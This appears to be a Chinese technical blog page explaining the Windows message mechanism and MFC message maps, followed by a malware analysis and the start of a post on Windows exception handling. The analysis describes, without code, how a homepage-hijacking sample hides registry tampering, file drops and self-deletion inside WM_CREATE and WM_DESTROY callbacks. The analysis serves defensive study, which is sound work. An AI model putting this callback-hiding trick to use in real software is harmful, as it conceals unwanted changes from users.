class="line">&#125;MSG,*PMSG;</span><br></pre></td></tr></table></figure>
<p>消息按照用途可以分为：</p>
<ul>
<li>窗口消息，比如WM_PAINT窗口绘制、WM_CREATE窗口创建等等</li>
<li>命令消息，一般是指WM_COMMAND，表示用户执行了一个命令，产生的对象一般是菜单或是控件</li>
<li>通知消息，一般是指WM_NOTIFY，由公用控件发出</li>
<li>反射消息，处理需要经过”反射”机制的消息，之后会详细说明</li>
</ul>
<p>消息按照区段可分为：</p>
<ul>
<li><p>标识符由0x0000到0x03ff的系统消息</p>
</li>
<li><p>0x0001-0x0087    窗口消息。<br>0x00A0-0x00A9    非客户区消息<br>0x0100-0x0108    键盘消息<br>0x0111-0x0126    菜单消息<br>0x0132-0x0138    颜色控制消息<br>0x0200-0x020A    鼠标消息<br>0x0211-0x0213    菜单循环消息<br>0x0220-0x0230    多文档消息<br>0x03E0-0x03E8    DDE消息</p>
</li>
<li><p>标识符由0x0400到0x7FFF的用户自定义消息，以VM_USER（0x0400）为基址，自定义偏移所对应的消息</p>
</li>
<li>标识符由0x8000到0xBFFF的用户自定语消息，一般是基于某一个窗口类。用作应用之间的通信</li>
<li>标识符由0xC000到0xFFFF的来自于RegisterWindowMessage函数，它会将传入的字符串注册成一个信息</li>
</ul>
<h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><p>Windows维护了两种类型的队列，一种是<strong>系统消息队列</strong>，它是唯一的，用户的输入通过驱动程序转化为消息后会进入该队列，然后再将消息放入对应线程（窗口）的消息队列；另外一种是线程消息队列，在调用User或者GDI的函数时创建，队列中的消息会经过消息泵传递给窗口回调函数。</p>
<p>消息也不都是这么”听话”，比如一下的几种</p>
<ul>
<li>WM_PAINT、WM_TIMER等，它们只有在队列中没有其他消息的时候才会处理，而VM_PAINT甚至还会进行合并来提高效率，这其实是因为它们消息的优先级较低</li>
<li>WM_ACTIVATE、WM_SETFOCUS等，它们会绕过消息队列直接被目标窗口处理</li>
<li>来自其他线程的消息，处理上还是一样，但是它们的优先级较高一些，在下边消息处理中会有所体现</li>
</ul>
<h2 id="消息的处理过程"><a href="#消息的处理过程" class="headerlink" title="消息的处理过程"></a>消息的处理过程</h2><p>消息首先由系统或应用产生，由于应用的消息可定制化程度太高，所以我们这里选择系统的消息来作为例子。</p>
<p>消息的传递对应大体有两种方式，一种是POST，一种是SEND，涉及到了各种各样的发送形式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">postMessage <span class="comment">//消息进入消息队列中后立即返回，消息可能不被处理。</span></span><br><span class="line">PostThreadMessage <span class="comment">//消息放入指定线程的消息队列中后立即返回，消息可能不被处理。</span></span><br><span class="line">SendMessage <span class="comment">//消息进入消息队列中，处理后才返回，如果消息不被处理，发送消息的线程将一直处于阻塞状态，等待消息返回。</span></span><br><span class="line">SendNotifyMessage<span class="comment">//如果消息进入本线程，则为SendMessage()，不是则采取postMessage()，当目标线程仍然依send处理</span></span><br><span class="line">SendMessageTimeout <span class="comment">//消息进入消息队列，处理或超时则返回，实际上SendMessage()就是建立在该函数上的</span></span><br><span class="line">SendMessageCallback <span class="comment">//在本线程再指定一个回调函数，当处理完后再次处理</span></span><br><span class="line">BroadcastSystemMessage <span class="comment">//发送目标为系统组件，比如驱动程序</span></span><br></pre></td></tr></table></figure>
<p>消息发送处理时会先判定消息的目标是不是在同一线程而产生不同的结果</p>
<ul>
<li>是，SendMessage()发送的消息不进入消息队列直接处理，而postMessage()进入消息队列</li>
<li>否，SendMessage()发送消息至目标线程的队列，然后监视直至处理，PostThreadMessage()进入队列后返回</li>
</ul>
<p>其实真正处理消息的就是一个窗口过程函数，它的参数实际上就是一个简化的MSG结构，包括了：对应窗口的句柄、消息的ID、消息的参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br></pre></td></tr></table></figure>
<p>当我们创建一个窗口的时候有一个注册窗口的过程，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ATOM <span class="title">MyRegisterClass</span><span class="params">(HINSTANCE hInstance)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   WNDCLASSEX wcex;  </span><br><span class="line">  </span><br><span class="line">   wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);  </span><br><span class="line">  </span><br><span class="line">   wcex.style   = CS_HREDRAW | CS_VREDRAW;  </span><br><span class="line">   wcex.lpfnWndProc = WndProc; </span><br><span class="line">   wcex.cbClsExtra  = <span class="number">0</span>;  </span><br><span class="line">   wcex.cbWndExtra  = <span class="number">0</span>;  </span><br><span class="line">   wcex.hInstance  = hInstance;  </span><br><span class="line">   wcex.hIcon   = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WINDOWSP));  </span><br><span class="line">   wcex.hCursor  = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);  </span><br><span class="line">   wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+<span class="number">1</span>);  </span><br><span class="line">   wcex.lpszMenuName = MAKEINTRESOURCE(IDC_WINDOWSP);  </span><br><span class="line">   wcex.lpszClassName = szWindowClass;  </span><br><span class="line">   wcex.hIconSm  = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));  </span><br><span class="line">  </span><br><span class="line">   <span class="keyword">return</span> RegisterClassEx(&amp;wcex);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很显然在注册时就绑定了上面的窗口过程函数，进而对各式各样的消息进行处理</p>
<p>紧接着就到了从队列中接受消息的过程，消息队列中对消息的处理主要有以下三个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PeekMessage</span><span class="params">(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">GetMessage</span><span class="params">(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">WaitMessage</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>PeekMessage用来判断队列中有没有消息，可通过设置wRemoveMsg来决定是否删除进行判断的消息</p>
</li>
<li><p>GetMessage会取出线程的消息到一个MSG结构中，如果调用了该函数且队列为空就会出现线程挂起，进入休眠状态，CPU会分配给其他线程。这里涉及到线程、进程方面的知识，以后再作详细说明</p>
</li>
<li><p>WaitMessage，当没有消息时使用，使线程挂起处于等待状态</p>
</li>
</ul>
<p>当然有的消息中的内容并不能被直接识别，还需要一个翻译过程，也就是需要调用TranslateMessage、TranslateAccelerator两个函数进行处理，这里主要是键盘等外部设备用户的输入（后者是用来处理快捷键的），普通消息可以跳过</p>
<p>接着就是重头戏了，DispatchMessage函数，看这个名字有没有想到之前DisPatchException？它们同样是用来分发的函数，则不过之前分发的是异常，现在分发的消息罢了</p>
<ul>
<li>检查目标窗口是否存在，不存在直接将消息丢弃</li>
<li>是否为不必须处理的事件，举个栗子，比如窗口边框没左键的功能，你还疯狂点它。如果是的话进入DefWindowProc进行下一步处理，处理很简单，再生成一个新的消息传出去，重复过程</li>
<li>调用相应的回调函数</li>
</ul>
<p>可以看到正儿八经的消息到这就告一段落了，反而是那些”不需要”的消息耽误事还要再走一遍……</p>
<h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>死锁，即Message Deadlocks，这个词很好理解，生动点说就是暗恋的俩人都在等待对方给发消息，结果都不好意思发就一直等着。比如下面的例子：</p>
<ul>
<li><p>a线程发消息1给b线程</p>
</li>
<li><p>b线程处理消息1，回调函数中发了消息2给a</p>
</li>
<li><p>a接到消息2，但因为b对消息1的处理结果还没回来而等待</p>
</li>
<li><p>b因为消息2的处理结果还没回来而等待</p>
</li>
</ul>
<p>好了，这哥俩现在就处于死锁状态了，俩人都干愣着。这是我们刻意的构造的一种情况，更多的时候死锁的产生还是由于发送的消息被处理时被”丢弃”了，而发送与接收的线程是同一队列，这就会导致该线程”死”了</p>
<p>为了防止死锁现象的产生，我们可以使用上面提到的SendMessageTimeout来设置最大等待时间</p>
<h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p>从操作系统的角度讲，在Windows的世界里，一个按钮的改变应该发消息给父窗口，由父窗口操作；从编程语言的角度讲，C++的世界里，一个按钮就是一个类的具体对象，它应该自己处理自己的变化，这就有矛盾了，那这样是处理呢？</p>
<p>这样的矛盾就让反射机制诞生了，对于控件自己应该处理的内容，当父窗口收到了相关消息时，重新发回给控件。</p>
<h2 id="MFC消息映射"><a href="#MFC消息映射" class="headerlink" title="MFC消息映射"></a>MFC消息映射</h2><p>MFC的消息处理其实本质上并没有什么不同，但是MFC做了一定的封装，掩盖了一部分消息的处理，使用起来比Windows消息处理更加简洁，这个封装起来的过程也就是消息映射。我们在vs上试着编辑一个mfc程序，当我们手动添加一个控件并指定了它的OnLButtonDown时，会自动为我们添加三处代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDrawView</span> :</span> <span class="keyword">public</span> CView</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">afx_msg <span class="keyword">void</span> <span class="title">OnLButtonDown</span><span class="params">(UINT nFlags, CPoint point)</span></span>;<span class="comment">//afx_msg指的是消息响应函数，此处也就是函数的声明</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ON_WM_LBUTTONDOWN()<span class="comment">//此处定义了消息的映射宏</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CDrawView::OnLButtonDown(UINT nFlags, CPoint point)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line">    CView::OnLButtonDown(nFlags, point);<span class="comment">//此处为消息响应函数的定义</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上mfc为每一个要处理消息的类都维护了一个静态的消息映射表，一种消息对应了一种消息处理函数指针，不同的类因为要处理的消息不同，所以维护的表的大小也有差异，当该类的实例需要处理消息时，只需要搜索该表寻找相应的函数即可。上面为我们添加的消息的映射宏就是实现了高效的维护消息映射表的功能，实际上它展开后就是一个具体的消息结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	UINT nMessage;   <span class="comment">// windows message</span></span><br><span class="line">	UINT nCode;      <span class="comment">// control code or WM_NOTIFY code</span></span><br><span class="line">	UINT nID;        <span class="comment">// control ID (or 0 for windows messages)</span></span><br><span class="line">	UINT nLastID;    <span class="comment">// used for entries specifying a range of control id's</span></span><br><span class="line">	UINT_PTR nSig;       <span class="comment">// signature type (action) or pointer to message #</span></span><br><span class="line">	AFX_PMSG pfn;    <span class="comment">// routine to call (or special value)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>消息的处理过程在一下函数中完成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CWnd::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// OnWndMsg does most of the work, except for DefWindowProc call</span></span><br><span class="line">	LRESULT lResult = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!OnWndMsg(message, wParam, lParam, &amp;lResult))</span><br><span class="line">		lResult = DefWindowProc(message, wParam, lParam);</span><br><span class="line">	<span class="keyword">return</span> lResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中的关键函数也就是OnWndMsg</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">BOOL CWnd::OnWndMsg(UINT message, WPARAM wParam, LPARAM lParam, LRESULT* pResult)</span><br><span class="line">&#123;</span><br><span class="line">	LRESULT lResult = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">union</span> MessageMapFunctions mmf;</span><br><span class="line">	mmf.pfn = <span class="number">0</span>;</span><br><span class="line">	CInternalGlobalLock winMsgLock;</span><br><span class="line">	<span class="comment">// special case for commands</span></span><br><span class="line">	<span class="keyword">if</span> (message == WM_COMMAND)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (OnCommand(wParam, lParam))</span><br><span class="line">		&#123;</span><br><span class="line">			lResult = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">goto</span> LReturnTrue;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">// special case for notifies</span></span><br><span class="line">	<span class="keyword">if</span> (message == WM_NOTIFY)</span><br><span class="line">	&#123;</span><br><span class="line">		NMHDR* pNMHDR = (NMHDR*)lParam;</span><br><span class="line">		<span class="keyword">if</span> (pNMHDR-&gt;hwndFrom != <span class="literal">NULL</span> &amp;&amp; OnNotify(wParam, lParam, &amp;lResult))</span><br><span class="line">			<span class="keyword">goto</span> LReturnTrue;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line">LDispatch:</span><br><span class="line">	ASSERT(message &lt; <span class="number">0xC000</span>);</span><br><span class="line"> </span><br><span class="line">	mmf.pfn = lpEntry-&gt;pfn;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">switch</span> (lpEntry-&gt;nSig)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		ASSERT(FALSE);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> AfxSig_l_p:</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="function">CPoint <span class="title">point</span><span class="params">(lParam)</span></span>;		</span><br><span class="line">			lResult = (<span class="keyword">this</span>-&gt;*mmf.pfn_l_p)(point);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>检查消息是否有对应的处理函数声明和消息映射宏</li>
<li>检查相应的消息响应函数，存在则执行</li>
<li>检查基类的消息响应函数，存在则执行</li>
</ul>
<p>当然这里只是简单的聊了一聊，关于MFC的消息映射实际上还有很多很多的门道，由于篇幅问题就不再说了，以后再做总结。最后还有个问题，同样是维护一张表，为什么不干脆就用c++的虚函数实现呢？其实答案很简单，上面也提到了，大家可以自己想一想。</p>
<h2 id="实战病毒程序"><a href="#实战病毒程序" class="headerlink" title="实战病毒程序"></a>实战病毒程序</h2><p>由于实际分析一个病毒过程很繁琐，所以我们这里只说重点，其余的详细病毒行为不再赘述</p>
<h3 id="病毒行为捕获"><a href="#病毒行为捕获" class="headerlink" title="病毒行为捕获"></a>病毒行为捕获</h3><p>利用云沙箱、虚拟机等对病毒的行为进行测试</p>
<ul>
<li>在C:\Users\xxx\AppData\Roaming\hao123释放hao123.exe，并创建桌面的快捷方式</li>
<li>修改注册表、篡改首页</li>
<li>自删除，但是云沙箱并没有检测到</li>
</ul>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1u2ppd15zj30ng05idgk.jpg" alt="image-20190407145345811"></p>
<p>通过od查询到了大量的可疑字符串，包括系统应用名、注册表项、网址等</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1u2ozbjr7j30f40gcgot.jpg" alt="image-20190407145301954"></p>
<p>看ida的反汇编结果，可以看到似乎病毒没有做什么恶意操作，虽然有几个call比较可疑，但点进去分析都没有发现和我们之前发现的恶意行为相关的代码，连之前发现的可以字符串都没有了踪迹，仿佛就是单单调用了几个常见的函数而已</p>
<p>紧接着看一看od的载入情况，可疑字符串的调用似乎仍然和程序没关系，仅仅是有代码而已，但我们多次实验后，可以在某个call找到了程序唯一的行为，并且这里我们总算是发现了可疑之处</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1u2s038ouj30rq0aoq5z.jpg" alt="image-20190407145558511"></p>
<p>程序调用了CreateWindowEx函数，但却将窗口的样式被设置成为WS_EX_TOOLWINDOW，查阅资料我们可以发现带有这个属性的窗口有以下特点：</p>
<ol>
<li><p>不在任务栏显示。</p>
</li>
<li><p>不显示在Alt+Tab的切换列表中。</p>
</li>
<li><p>在任务管理器的窗口管理Tab中不显示。</p>
</li>
</ol>
<p>换句话说，用户就基本上是发现不了病毒创建窗口这一操作的，那这又有什么用呢？</p>
<p>我们用od在此处下断点，仔细观察，发现当od执行到该命令时会产生特别奇怪的现象，之前发现的那个hao123的exe竟然出现了，并且也成功在桌面创建了快捷方式，这就很让人疑惑了，明明前面的函数调用完全没有涉及这方面的操作，这是怎么实现的呢？</p>
<p>实际上这就是通过消息机制调用回调函数实现的，因为回调函数是不需要我们去指定调用的时机，只要有相应的消息就会触发，病毒正是钻了这个空子，让我们第一时间无法发现函数的调用。</p>
<p>程序调用的CreateWindows会发送一个名为WM_CREATE的消息，而既然有这个消息了，那我们的程序就要对这个消息有所反馈，在CreateWindows这个消息发出后，我们的恶意程序就接受了这个消息，紧接着按照程序设定的原始方案执行恶意代码。</p>
<p>我们去找RegisterClass这个函数，这个函数就帮程序设置好了对应不同的消息要进行哪一些的处理。</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g1u37egsxcj313w0im493.jpg" alt="image-20190407151046671"></p>
<p>利用od找到函数的参数中包含的消息的结构体，结构体的第三个成员处下断，我们就可以截获到处理各个消息的switch语句了。进入即可找到恶意代码的位置了</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1u37mjyg7j317s0fedq4.jpg" alt="image-20190407151059400"></p>
<p>首先就是在此处修改了注册表，将目标网址添加了进去，从而实现了篡改主页的功能。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1u37w428jj317q0qw495.jpg" alt="image-20190407151114516"></p>
<p>同样利用注册表修改了我们的收藏夹</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1g1u3845bqgj312204m405.jpg" alt="image-20190407151127892"></p>
<p>这里调用了SHGetFolderPathW这个函数，这个函数在病毒中很常见，是用来获取系统的特殊路径的，也就是上面提到的C:\Users\xxx\AppData\Roaming，紧接着又将hao123和上面的路径连接起来，这样就组成了之前释放的恶意文件的存储路径</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1u396gcvuj30su06ognt.jpg" alt="image-20190407151228670"></p>
<p>释放了另外一个恶意文件</p>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1g1u39n0798j30sa07wq5u.jpg" alt="image-20190407151255735"></p>
<p>创建快捷方式</p>
<p>到这里该消息的响应操作就执行完了，但程序不应该结束啊，因为我们还是没有找到自删除相关的操作啊。这里大胆发挥想象力，会不会和开始一样，也是通过某个消息机制实现的呢？</p>
<p>联系带程序非常诡异的自删除时间和之前那个用户“感受”不到的窗口，我们好像稍微有了一点点思路：既然开窗口有操作，那关闭窗口是不是也可以有操作呢？我们立刻着手寻找VM_DESTROY</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1g1u3dlnw9cj30u002ygms.jpg" alt="image-20190407151620815"></p>
<p>果然，它释放了一个bat批处理文件，内容很简单，删除恶意程序，然后把自己也删除。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/25/windows调试 - 从0开始的异常处理/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/25/windows调试 - 从0开始的异常处理/" itemprop="url">Windows调试 -- 从0开始的异常处理（上）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-25T11:18:06+08:00">
                2019-05-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Windows调试艺术/" itemprop="url" rel="index">
                    <span itemprop="name">Windows调试艺术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>文章在360的安全客上首发，搬运到自己博客上来，可以去安全客查看详细博文。</p>
<h1 id="Windows调试-–-从0开始的异常处理（上）"><a href="#Windows调试-–-从0开始的异常处理（上）" class="headerlink" title="Windows调试 – 从0开始的异常处理（上）"></a>Windows调试 – 从0开始的异常处理（上）</h1><p>windows的异常处理一直是大家关心的重点，不管是对操作系统的学习还是windows的漏洞利用，都逃不过异常处理，这篇文章将会从windows异常的基础、维护异常信息的结构、异常的详细处理、SEH和VEH等方面来详细讨论Windows下的异常处理机制并通过《格蠹汇编》一书中的几个课后实验来说明异常在调试中的实际应用。</p>
<h2 id="什么是异常？"><a href="#什么是异常？" class="headerlink" title="什么是异常？"></a>什么是异常？</h2><p>简单来说异常就是对于非预期状况的处理，当我们在运行某个程序时出现了异常状况，就会进入异常处理流程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现异常 -&gt; 寻找处理异常的方法 -&gt; 恢复执行或者发生错误</span><br></pre></td></tr></table></figure>
<p>异常又可以分为软件异常（由操作系统或应用程序引发的）、硬件异常（由cpu产生），其中硬件异常又和中断、系统调用等行为有着密切的联系，下面就来具体讨论一下。</p>
<h3 id="硬件异常"><a href="#硬件异常" class="headerlink" title="硬件异常"></a>硬件异常</h3><p>硬件异常可以分为三种：</p>
<ul>
<li>fault，在处理此类异常时，操作系统会将遭遇异常时的“现场”保存下来（比如EIP、CS等寄存器的值），然后将调用相应的异常处理函数，如果对异常的处理成功了（没成功的情况会在下文中提到），那就恢复到原始现场，继续执行。最经典的fault例子莫过于Page Fault了，在分页机制下，当我们读到某个还未载入到内存的页时，就会触发该异常，操作系统会将该页载入内存，然后重新执行读取该页的指令，这是分页机制实现的重要机制。</li>
<li>trap，在处理此类异常时，操作系统会将异常的“下文”保存，在处理异常后，直接执行导致异常的指令的下一条指令。我们在调试过程中常用的断点操作就是基于这类异常的，当我们在某处下断点时调试器会将原本此处的指令对应的十六进制保存下来，然后替换第一个字节替换为0xCC的，也就是int 3，造成断点异常，中断（此处的中断用的是break，而我们一般说的中断是interrupt，请读者务必区分清楚）到调试器，程序在运行到此处就会停止等待下一步的指令，而当我们继续执行时调试器就会将该指令替换为原来的指令，程序也就恢复正常执行了。不知道大家有没有注意过，在进行程序调试时经常会看见hex界面显示大量的“烫烫烫”，这其实是0xcc对应的中文字符，因为这些地址的内容程序并不想让我们访问，一旦我们访问这些地址，就会读到0xcc，程序也就“中断”了。</li>
<li>abort，中止异常，主要是处理严重的硬件错误等，这类异常不会恢复执行，会强制性退出。</li>
</ul>
<p>在windows系统中，硬件异常和中断被不加区分的存放在了一个向量表中，也就是我们常说的IDT（interruption descriptor table），我们可以使用windbg（注意要在内核调试状态，笔者打印的是64位的情况）的!idt指令来查看IDT，不过windbg打印出的并不是真正的IDT结构，而是经过“解析”后的，更易于我们查看。表中前面的序号代表着它对应的是第几个中断或异常，后面的函数则是对这种异常或中断的处理函数，也叫做异常处理例程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; !idt</span><br><span class="line">Dumping IDT: fffff80743286000</span><br><span class="line">00:	fffff80740dd5100 nt!KiDivideErrorFaultShadow</span><br><span class="line">01:	fffff80740dd5180 nt!KiDebugTrapOrFaultShadow	Stack = 0xFFFFF8074328A9E0</span><br><span class="line">02:	fffff80740dd5200 nt!KiNmiInterruptShadow	Stack = 0xFFFFF8074328A7E0</span><br><span class="line">03:	fffff80740dd5280 nt!KiBreakpointTrapShadow</span><br><span class="line">04:	fffff80740dd5300 nt!KiOverflowTrapShadow</span><br><span class="line">05:	fffff80740dd5380 nt!KiBoundFaultShadow</span><br><span class="line">06:	fffff80740dd5400 nt!KiInvalidOpcodeFaultShadow</span><br><span class="line">07:	fffff80740dd5480 nt!KiNpxNotAvailableFaultShadow</span><br><span class="line">08:	fffff80740dd5500 nt!KiDoubleFaultAbortShadow	Stack = 0xFFFFF8074328A3E0</span><br><span class="line">09:	fffff80740dd5580 nt!KiNpxSegmentOverrunAbortShadow</span><br><span class="line">0a:	fffff80740dd5600 nt!KiInvalidTssFaultShadow</span><br><span class="line">0b:	fffff80740dd5680 nt!KiSegmentNotPresentFaultShadow</span><br><span class="line">0c:	fffff80740dd5700 nt!KiStackFaultShadow</span><br><span class="line">0d:	fffff80740dd5780 nt!KiGeneralProtectionFaultShadow</span><br><span class="line">0e:	fffff80740dd5800 nt!KiPageFaultShadow</span><br><span class="line">0f:	fffff80740dd62f8 nt!KiIsrThunkShadow+0x78</span><br><span class="line">10:	fffff80740dd5880 nt!KiFloatingErrorFaultShadow</span><br><span class="line">11:	fffff80740dd5900 nt!KiAlignmentFaultShadow</span><br><span class="line">12:	fffff80740dd5980 nt!KiMcheckAbortShadow	Stack = 0xFFFFF8074328A5E0</span><br><span class="line">13:	fffff80740dd5a80 nt!KiXmmExceptionShadow</span><br><span class="line">14:	fffff80740dd5b00 nt!KiVirtualizationExceptionShadow</span><br><span class="line">15:	fffff80740dd5b80 